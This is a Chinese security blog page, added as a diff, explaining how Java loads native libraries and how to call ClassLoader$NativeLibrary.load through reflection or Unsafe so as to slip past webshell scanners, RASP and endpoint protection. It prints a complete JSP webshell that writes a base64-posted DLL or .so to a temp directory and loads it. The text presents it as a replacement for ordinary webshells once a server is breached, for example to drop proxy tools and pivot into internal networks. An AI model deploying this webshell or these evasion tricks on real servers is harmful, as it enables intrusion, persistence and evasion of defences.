@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=9bd5ca801b57208805a649cd598388a48ca56336">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#151515">
+<meta name="msapplication-navbutton-color" content="#151515">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Java加载动态链接库 | BlogPapers</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Java加载动态链接库" />
+<meta property="og:locale" content="en_US" />
+<link rel="canonical" href="http://0.0.0.0:4000/2022/Java%E5%8A%A0%E8%BD%BD%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%E6%96%B9%E5%BC%8F.html" />
+<meta property="og:url" content="http://0.0.0.0:4000/2022/Java%E5%8A%A0%E8%BD%BD%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%E6%96%B9%E5%BC%8F.html" />
+<meta property="og:site_name" content="BlogPapers" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Java加载动态链接库" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","headline":"Java加载动态链接库","url":"http://0.0.0.0:4000/2022/Java%E5%8A%A0%E8%BD%BD%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%E6%96%B9%E5%BC%8F.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>BlogPapers</h1>
+        </a>
+        <h2><a href="sumsec.me"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=24&pause=1000&color=FDFDFD&background=13797800&center=true&vCenter=true&width=435&lines=%F0%9F%91%8B%EF%BC%8C%E5%83%8F%E6%B8%85%E6%B0%B4%E4%B8%80%E8%88%AC%E6%B8%85%E6%BE%88%E9%80%8F%E6%98%8E" alt="SummerSec" /></a></h2>
+
+        <section id="downloads">
+          
+          <a href="https://github.com/SummerSec/BlogPapers" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <h2 id="java加载动态链接库">Java加载动态链接库</h2>
+
+<h3 id="前言">前言</h3>
+
+<p>前段时间在<strong>赛博回忆录群聊</strong>中看到师傅们谈论Java加载动态链接库的方法，研究之后，笔者认为该方案某种程度上是可以替代webshell一种方式。</p>
+
+<p>文中研究代码会上传到<a href="https://github.com/SummerSec/JavaLearnVulnerability/tree/master/Rce_Echo/TomcatEcho">JavaLearnVulnerability</a>项目上。</p>
+
+<hr />
+
+<h3 id="加载动态链接库">加载动态链接库</h3>
+
+<p>群中聊天记录存在着相似的代码片段，dll下载地址仓库<a href="https://github.com/3gstudent/test">3gstudent/test</a>。</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">static</span>  <span class="kt">void</span> <span class="nf">loadDll3</span><span class="o">(){</span>
+    <span class="k">try</span> <span class="o">{</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">load</span><span class="o">(</span><span class="s">"D:\\temp\\calc_x64.dll"</span><span class="o">);</span>
+    <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="nc">UnsatisfiedLinkError</span> <span class="n">e</span><span class="o">){</span>
+        <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p><img src="https://img.sumsec.me//46u5246ec46u5246ec.png" alt="image-20220124115239143" /></p>
+
+<p>可以看到可以直接调用System.load方法进行直接加载dll文件。</p>
+
+<hr />
+
+<h3 id="load调用流程">load调用流程</h3>
+
+<p>跟进去可以发现<strong>load</strong>方法调用<strong>Runtime.getRuntime().load0</strong>方法，filename是传入文件名。也就是说我们也可以调用Runtime的load方法进行加载动态链接库。</p>
+
+<p><img src="https://img.sumsec.me//44u944ec44u944ec.png" alt="image-20220124130944696" /></p>
+
+<p>但其实发现<strong>load0</strong>方法是无法直接调用的，但可以直接调用<strong>load</strong>方法从而间接调用<strong>load0</strong>方法。</p>
+
+<p><img src="https://img.sumsec.me//58u1158ec58u1158ec.png" alt="image-20220124131158138" /></p>
+
+<p>在<strong>load0</strong>方法的最后一行是调用<strong>ClassLoader</strong>的<strong>loadLibrary</strong>方法，传入的参数依次是当前类，和文件名，已经是否是绝对路径。</p>
+
+<p><img src="https://img.sumsec.me//41u1441ec41u1441ec.png" alt="image-20220124131440998" /></p>
+
+<p>进行跟进<strong>ClassLoader#loadLibrary</strong>方法，方法声明写着一行注释。主要说明loadLibrary方法在<code class="language-plaintext highlighter-rouge">java.lang.Runtime</code>类中调用实现了<strong>load</strong>和<strong>loadLibrary</strong>方法。</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Invoked in the java.lang.Runtime class to implement load and loadLibrary.</span>
+<span class="kd">static</span> <span class="kt">void</span> <span class="nf">loadLibrary</span><span class="o">(</span><span class="nc">Class</span><span class="o">&lt;?&gt;</span> <span class="n">fromClass</span><span class="o">,</span> <span class="nc">String</span> <span class="n">name</span><span class="o">,</span>
+                        <span class="kt">boolean</span> <span class="n">isAbsolute</span><span class="o">)</span> <span class="o">{</span>
+    <span class="nc">ClassLoader</span> <span class="n">loader</span> <span class="o">=</span>
+        <span class="o">(</span><span class="n">fromClass</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">?</span> <span class="kc">null</span> <span class="o">:</span> <span class="n">fromClass</span><span class="o">.</span><span class="na">getClassLoader</span><span class="o">();</span>
+    <span class="k">if</span> <span class="o">(</span><span class="n">sys_paths</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">usr_paths</span> <span class="o">=</span> <span class="n">initializePath</span><span class="o">(</span><span class="s">"java.library.path"</span><span class="o">);</span>
+        <span class="n">sys_paths</span> <span class="o">=</span> <span class="n">initializePath</span><span class="o">(</span><span class="s">"sun.boot.library.path"</span><span class="o">);</span>
+    <span class="o">}</span>
+    <span class="k">if</span> <span class="o">(</span><span class="n">isAbsolute</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">loadLibrary0</span><span class="o">(</span><span class="n">fromClass</span><span class="o">,</span> <span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="n">name</span><span class="o">)))</span> <span class="o">{</span>
+            <span class="k">return</span><span class="o">;</span>
+        <span class="o">}</span>
+        <span class="k">throw</span> <span class="k">new</span> <span class="nf">UnsatisfiedLinkError</span><span class="o">(</span><span class="s">"Can't load library: "</span> <span class="o">+</span> <span class="n">name</span><span class="o">);</span>
+    <span class="o">}</span>
+    <span class="k">if</span> <span class="o">(</span><span class="n">loader</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+        <span class="nc">String</span> <span class="n">libfilename</span> <span class="o">=</span> <span class="n">loader</span><span class="o">.</span><span class="na">findLibrary</span><span class="o">(</span><span class="n">name</span><span class="o">);</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">libfilename</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+            <span class="nc">File</span> <span class="n">libfile</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="n">libfilename</span><span class="o">);</span>
+            <span class="k">if</span> <span class="o">(!</span><span class="n">libfile</span><span class="o">.</span><span class="na">isAbsolute</span><span class="o">())</span> <span class="o">{</span>
+                <span class="k">throw</span> <span class="k">new</span> <span class="nf">UnsatisfiedLinkError</span><span class="o">(</span>
+<span class="s">"ClassLoader.findLibrary failed to return an absolute path: "</span> <span class="o">+</span> <span class="n">libfilename</span><span class="o">);</span>
+            <span class="o">}</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">loadLibrary0</span><span class="o">(</span><span class="n">fromClass</span><span class="o">,</span> <span class="n">libfile</span><span class="o">))</span> <span class="o">{</span>
+                <span class="k">return</span><span class="o">;</span>
+            <span class="o">}</span>
+            <span class="k">throw</span> <span class="k">new</span> <span class="nf">UnsatisfiedLinkError</span><span class="o">(</span><span class="s">"Can't load "</span> <span class="o">+</span> <span class="n">libfilename</span><span class="o">);</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+    <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span> <span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">sys_paths</span><span class="o">.</span><span class="na">length</span> <span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
+        <span class="nc">File</span> <span class="n">libfile</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="n">sys_paths</span><span class="o">[</span><span class="n">i</span><span class="o">],</span> <span class="nc">System</span><span class="o">.</span><span class="na">mapLibraryName</span><span class="o">(</span><span class="n">name</span><span class="o">));</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">loadLibrary0</span><span class="o">(</span><span class="n">fromClass</span><span class="o">,</span> <span class="n">libfile</span><span class="o">))</span> <span class="o">{</span>
+            <span class="k">return</span><span class="o">;</span>
+        <span class="o">}</span>
+        <span class="n">libfile</span> <span class="o">=</span> <span class="nc">ClassLoaderHelper</span><span class="o">.</span><span class="na">mapAlternativeName</span><span class="o">(</span><span class="n">libfile</span><span class="o">);</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">libfile</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">loadLibrary0</span><span class="o">(</span><span class="n">fromClass</span><span class="o">,</span> <span class="n">libfile</span><span class="o">))</span> <span class="o">{</span>
+            <span class="k">return</span><span class="o">;</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+    <span class="k">if</span> <span class="o">(</span><span class="n">loader</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span> <span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">usr_paths</span><span class="o">.</span><span class="na">length</span> <span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
+            <span class="nc">File</span> <span class="n">libfile</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="n">usr_paths</span><span class="o">[</span><span class="n">i</span><span class="o">],</span>
+                                    <span class="nc">System</span><span class="o">.</span><span class="na">mapLibraryName</span><span class="o">(</span><span class="n">name</span><span class="o">));</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">loadLibrary0</span><span class="o">(</span><span class="n">fromClass</span><span class="o">,</span> <span class="n">libfile</span><span class="o">))</span> <span class="o">{</span>
+                <span class="k">return</span><span class="o">;</span>
+            <span class="o">}</span>
+            <span class="n">libfile</span> <span class="o">=</span> <span class="nc">ClassLoaderHelper</span><span class="o">.</span><span class="na">mapAlternativeName</span><span class="o">(</span><span class="n">libfile</span><span class="o">);</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">libfile</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">loadLibrary0</span><span class="o">(</span><span class="n">fromClass</span><span class="o">,</span> <span class="n">libfile</span><span class="o">))</span> <span class="o">{</span>
+                <span class="k">return</span><span class="o">;</span>
+            <span class="o">}</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+    <span class="c1">// Oops, it failed</span>
+    <span class="k">throw</span> <span class="k">new</span> <span class="nf">UnsatisfiedLinkError</span><span class="o">(</span><span class="s">"no "</span> <span class="o">+</span> <span class="n">name</span> <span class="o">+</span> <span class="s">" in java.library.path"</span><span class="o">);</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>在判断传入的是否是绝对路径后就调用了<strong>loadLibrary0</strong>方法</p>
+
+<p><img src="https://img.sumsec.me//50u2050ec50u2050ec.png" alt="image-20220124132050291" /></p>
+
+<p>在<strong>loadLibrary0</strong>方法中会读取<strong>nativeLibraryContext</strong>内容，判断是否已经被其他的classloader加载过了。</p>
+
+<p><img src="https://img.sumsec.me//36u4336ec36u4336ec.png" alt="image-20220124134336447" /></p>
+
+<p>紧接着会实例化<strong>NativeLibrary</strong>类，然后调用load方法加载动态链接库。</p>
+
+<p><img src="https://img.sumsec.me//28u4528ec28u4528ec.png" alt="image-20220124134528474" /></p>
+
+<p>NativeLibrary是<strong>classloader</strong>中的一个静态匿名类，NativeLibrary中的load方法内容如下，可以发现是已经到native层面了。</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">native</span> <span class="kt">void</span> <span class="nf">load</span><span class="o">(</span><span class="nc">String</span> <span class="n">name</span><span class="o">,</span> <span class="kt">boolean</span> <span class="n">isBuiltin</span><span class="o">);</span>
+</code></pre></div></div>
+
+<hr />
+
+<h3 id="模拟load方法加载动态链接库">模拟load方法加载动态链接库</h3>
+
+<h4 id="为什么模拟">为什么模拟?</h4>
+
+<p>已经可以使用System和Runtime类调用load方法加载动态链接库，为什么还要模拟NativeLibrary或者是ClassLoader类加载动态链接库呢？</p>
+
+<ol>
+  <li>在webshell查杀工具、RASP、终端安全防护软件等安全软件工具会容易检测到System和Runtime的调用，很容易就会被安全软件查杀。大家都知道越到底层的查杀会越来越难，细想一下Native层面查杀成本就很高了。</li>
+  <li>模拟load方法可以避免中间过程异常从而导致加载失败，在Java层面调用越少就不容易出错，兼容性也会大大的提升。</li>
+</ol>
+
+<hr />
+
+<p>首先来看JDK中内置的可以加载动态链接库的几个方法</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">loadDll2</span><span class="o">(){</span>
+    <span class="nc">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">load</span><span class="o">(</span><span class="s">"D:\\temp\\calc_x64.dll"</span><span class="o">);</span>
+<span class="o">}</span>
+
+<span class="kd">public</span> <span class="kd">static</span>  <span class="kt">void</span> <span class="nf">loadDll3</span><span class="o">(){</span>
+    <span class="k">try</span> <span class="o">{</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">load</span><span class="o">(</span><span class="s">"D:\\temp\\calc_x64.dll"</span><span class="o">);</span>
+    <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="nc">UnsatisfiedLinkError</span> <span class="n">e</span><span class="o">){</span>
+        <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+<span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">loadDll4</span><span class="o">(){</span>
+        <span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">glass</span><span class="o">.</span><span class="na">utils</span><span class="o">.</span><span class="na">NativeLibLoader</span><span class="o">.</span><span class="na">loadLibrary</span><span class="o">(</span><span class="s">"\\..\\..\\..\\..\\..\\..\\..\\..\\temp\\calc_x64"</span><span class="o">);</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>loadDll2和loadDll3是都是具有高危类的调用，而loadDll4并不是在所有的环境都是通用的。</p>
+
+<p><strong>com.sun.glass.utils.NativeLibLoader.loadLibrary</strong>在写这篇文章的前两天看到浅蓝师傅的文章<a href="https://tttang.com/archive/1405/">探索高版本 JDK 下 JNDI 漏洞的利用方法</a>提到的。</p>
+
+<p>为什么这个com.sun.glass.utils.NativeLibLoader类并不是通用的呢？</p>
+
+<ol>
+  <li>存在于jdk\javafx-src.zip!\com\sun\glass\utils\NativeLibLoader.java，在不同的版本的jdk中javafx并不是都存在的。</li>
+  <li>NativeLibLoader会首先在jdk环境下找文件名，如果需要自定义路径必须使用../的方式进行目录穿越。并且如果是windows的话，只能穿越到JDK所在的盘符的根目录下。举例说明，如果JDK安装在<code class="language-plaintext highlighter-rouge">D:/java/JDK/</code>下，那么只能穿越到D盘的任意目录下面，比例说穿越到D:/temp/目录下，文件名参数就只能写成<strong>../../../../temp/calc</strong>，文件名还不能跟后缀，不然传入文件名会被变成<strong>calc.dll.dll</strong>。相对而言Linux平台是可以穿越任意目录的。</li>
+</ol>
+
+<hr />
+
+<h4 id="如何模拟">如何模拟？</h4>
+
+<ul>
+  <li>如果模拟ClassLoader加载就会存在两个方案
+    <ul>
+      <li>模拟ClassLoader的loadLibrary和loadLibrary0两个方案。</li>
+    </ul>
+  </li>
+  <li>如果模拟NativeLibrary就只存在load方法</li>
+</ul>
+
+<p><strong>ClassLoader#loadLibrary</strong></p>
+
+<p>loadLibrary方法是静态私有方法，无法直接调用。使用Java反射就能解决该问题代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    public static void loadDll(){
+        try {
+            Class clazz = Class.forName("java.lang.ClassLoader");
+            Method method = clazz.getDeclaredMethod("loadLibrary", Class.class, String.class, boolean.class);
+            method.setAccessible(true);
+            method.invoke(null, clazz, "D:\\temp\\calc_x64.dll", true);
+        }catch (Exception e){
+            e.printStackTrace();
+        }
+    }
+</code></pre></div></div>
+
+<p><strong>ClassLoader#loadLibrary0</strong>代码类似就不贴了。</p>
+
+<p><strong>NativeLibrary#load</strong></p>
+
+<p>由于NativeLibrary是ClassLoader的内部静态匿名类，无法直接进行实例化，进而调用load方法。解决方案有两种方式</p>
+
+<ul>
+  <li>使用反射获取构造方法，修改权限进而实例化，获取load方法、调用、传入参数。</li>
+</ul>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">String</span> <span class="n">file</span> <span class="o">=</span> <span class="s">"D:\\temp\\calc_x64.dll"</span><span class="o">;</span>
+<span class="nc">Class</span> <span class="n">a</span> <span class="o">=</span> <span class="nc">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"java.lang.ClassLoader$NativeLibrary"</span><span class="o">);</span>
+<span class="nc">Constructor</span> <span class="n">con</span> <span class="o">=</span> <span class="n">a</span><span class="o">.</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="k">new</span> <span class="nc">Class</span><span class="o">[]{</span><span class="nc">Class</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="nc">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="kt">boolean</span><span class="o">.</span><span class="na">class</span><span class="o">});</span>
+<span class="n">con</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+<span class="nc">Object</span> <span class="n">obj</span> <span class="o">=</span> <span class="n">con</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="nc">JDKClassLoaderBypass</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">file</span><span class="o">,</span><span class="kc">true</span><span class="o">);</span>
+<span class="nc">Method</span> <span class="n">method</span> <span class="o">=</span> <span class="n">obj</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">"load"</span><span class="o">,</span> <span class="nc">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="kt">boolean</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+<span class="n">method</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+<span class="n">method</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="n">file</span><span class="o">,</span> <span class="kc">false</span><span class="o">);</span>
+</code></pre></div></div>
+
+<ul>
+  <li>使用Unsafe类的<strong>allocateInstance</strong>方法获取实例类，由于unsafe的特性可以无视构造方法强制进行实例化，可以完美绕过限制，这种方法可以更好绕过RASP之类的安全防护。</li>
+</ul>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">String</span> <span class="n">file</span> <span class="o">=</span> <span class="s">"D:\\temp\\calc_x64.dll"</span><span class="o">;</span>
+<span class="nc">Class</span> <span class="n">aClass</span> <span class="o">=</span> <span class="nc">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"sun.misc.Unsafe"</span><span class="o">);</span>
+<span class="nc">Constructor</span><span class="o">&lt;?&gt;</span> <span class="n">declaredConstructor</span> <span class="o">=</span> <span class="n">aClass</span><span class="o">.</span><span class="na">getDeclaredConstructor</span><span class="o">();</span>
+<span class="n">declaredConstructor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+<span class="nc">Unsafe</span> <span class="n">unsafe</span> <span class="o">=</span> <span class="o">(</span><span class="nc">Unsafe</span><span class="o">)</span><span class="n">declaredConstructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
+<span class="nc">Object</span> <span class="n">obj</span> <span class="o">=</span>  <span class="n">unsafe</span><span class="o">.</span><span class="na">allocateInstance</span><span class="o">(</span><span class="n">a</span><span class="o">);</span>
+<span class="nc">Method</span> <span class="n">method</span> <span class="o">=</span> <span class="n">obj</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">"load"</span><span class="o">,</span> <span class="nc">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="kt">boolean</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+<span class="n">method</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+<span class="n">method</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="n">file</span><span class="o">,</span> <span class="kc">false</span><span class="o">);</span>
+</code></pre></div></div>
+
+<hr />
+
+<h3 id="实战化解决方案">实战化解决方案</h3>
+
+<h4 id="差异性">差异性</h4>
+
+<p>与传统的webshell对比一下，可达到免杀的效果。使用项目<a href="https://github.com/Rvn0xsy/SystemGap">Rvn0xsy/SystemGap</a>也可实现小马的效果，不同于传统的小马，这个可加个签名轻松做到免杀效果。对比传统webshell可以将frp等代理工具作为动态链接库形式发送给后端，直接写入目标服务器上。某种程度上是可以取代传统webshell，在某些操作还更加比webshell更加方便。比例说，上传frp、socks代理等操作，可以采用预先设置好命令，直接加载相应的动态链接库，直接一键化实现内网穿透。</p>
+
+<h4 id="解决方案">解决方案</h4>
+
+<p>团队师傅写一个静态资源页面<a href="https://loader.sumsec.me/"><strong>Dynamic Link Library Loader Tools</strong></a>项目临时地址<a href="https://github.com/SummerSec/Loader"><strong>loader</strong></a>就实现了上述功能，更多功能还在完善中，后续会更新到<a href="https://github.com/0x727"><strong>0x727</strong></a>团队项目中。</p>
+
+<p>对应加载动态链接库的恶意代码，以jsp代码形式。其实完全是可以改造成内存马的形式，也可以配合反序列化漏洞，上传漏洞等使用。</p>
+
+<details> 
+    <summary>Codes </summary>
+
+~~~java
+```java
+&lt;%
+    String p = request.getParameter("p");
+    String t = request.getServletContext().getRealPath("/");
+    java.io.PrintWriter outp = response.getWriter();
+    outp.println("WebRootPath:<br />" + t + "<br />");
+    t = request.getServletPath();
+    outp.println("ServletPath:<br />" + t + "<br />");
+    t = (new java.io.File(".").getAbsolutePath());
+    outp.println("WebServerPath:<br />" + t + "<br />");
+    java.util.Random random = new java.util.Random(System.currentTimeMillis());
+    outp.println("If you upload a dynamic link library it will be automatically uploaded to the system temp path. <br />" +
+            " If it is Windows it will be uploaded to C:/Windows/temp/, " +
+            "else if it is Linux it will be uploaded to the /tmp/ path <br />");
+
+    t = System.getProperty("os.name").toLowerCase();
+    if (t.contains("windows")) {
+        t = "C:/Windows/temp/dm" + random.nextInt(10000000) + "1.dll";
+    }else {
+        t = "/tmp/dm" + random.nextInt(10000000) + "1.so";
+    }
+    if (p != null) {
+        try {
+            java.io.FileOutputStream fos = new java.io.FileOutputStream(t);
+            fos.write(D(p));
+            fos.close();
+            N(t);
+            outp.println("Dynamic Link Library is uploaded, and the path is: " + t + "<br />");
+            outp.println("load uploaded success !!! <br />");
+        } catch (Exception e) {
+            outp.println(e.getMessage());
+        }
+    }
+    outp.flush();
+    outp.close();
+%&gt;
+
+&lt;%!
+    private void N(String t) throws Exception {
+        Object o;
+        Class a = Class.forName("java.lang.ClassLoader$NativeLibrary");
+        try {
+            java.lang.reflect.Constructor c = a.getDeclaredConstructor(new Class[]{Class.class,String.class,boolean.class});
+            c.setAccessible(true);
+            o = c.newInstance(Class.class,t,true);
+        }catch (Exception e){
+            Class u = Class.forName("sun.misc.Unsafe");
+            java.lang.reflect.Constructor&lt;?&gt; c = u.getDeclaredConstructor();
+            c.setAccessible(true);
+            sun.misc.Unsafe un = (sun.misc.Unsafe)c.newInstance();
+            o =  un.allocateInstance(a);
+        }
+        java.lang.reflect.Method method = o.getClass().getDeclaredMethod("load", String.class, boolean.class);
+        method.setAccessible(true);
+        method.invoke(o, t, false);
+    }
+
+    private byte[] D(String p) throws Exception {
+        try {
+            Class clazz = Class.forName("sun.misc.BASE64Decoder");
+            return (byte[])(clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), p));
+        } catch (Exception var5) {
+            Class clazz = Class.forName("java.util.Base64");
+            Object decoder = clazz.getMethod("getDecoder").invoke(null);
+            return (byte[])(decoder.getClass().getMethod("decode", String.class).invoke(decoder, p));
+        }
+    }
+%&gt;
+```
+~~~
+</details>
+
+<p><strong>效果展示</strong></p>
+
+<p>假如已经通过文件上传、RCE等方式上传了前面提到jsp木马。木马会输出一些信息，目前上传路径是写死的，后续这个可以改（以任何方式，这个不重要）。</p>
+
+<p><img src="https://img.sumsec.me//33u1333ec33u1333ec.png" alt="image-20220126201326631" /></p>
+
+<p>然后<strong>Dynamic Link Library Loader Tools</strong>输入url，选择Payload（目前只有弹计算器）。</p>
+
+<p><img src="https://img.sumsec.me//34u1634ec34u1634ec.png" alt="image-20220126201629504" /></p>
+
+<p>点击<strong>提交</strong>，会发送一个请求包以POST方法，发送p = ${payload}$资源。最终会跳转到对应url上，并在目标服务器弹出计算器。</p>
+
+<p><img src="https://img.sumsec.me//40u2040ec40u2040ec.png" alt="image-20220126202040625" /></p>
+
+<hr />
+
+<h3 id="总结">总结</h3>
+
+<p>目前只研究了Java加载动态链接库的方式，并实现了在Java层面最本质的加载方式。rebeyond 大佬在<a href="https://mp.weixin.qq.com/s/JIjBjULjFnKDjEhzVAtxhw">《Java内存攻击技术漫谈》</a>提及了<strong>Java跨平台任意Native代码执行</strong>，后续可能有望实现无文件加载动态链接库的方式，所以目前来看该技术前景还是很大的。</p>
+
+<p>加载动态链接库的方式可以实现传统webshell的部分功能（严谨），也能做到一些无法做到一些事情。试想如果动态链接库加上签名，那么终端对抗难度会降低，这也是与传统webshell的区别所在，也是一种特性。但与此同时，此技术还在初级发展阶段，还有很多需要改进的地方。</p>
+
+<hr />
+
+<h3 id="参考">参考</h3>
+
+<p>https://tttang.com/archive/1405</p>
+
+      </section>
+    </div>
+  </body>
+</html>
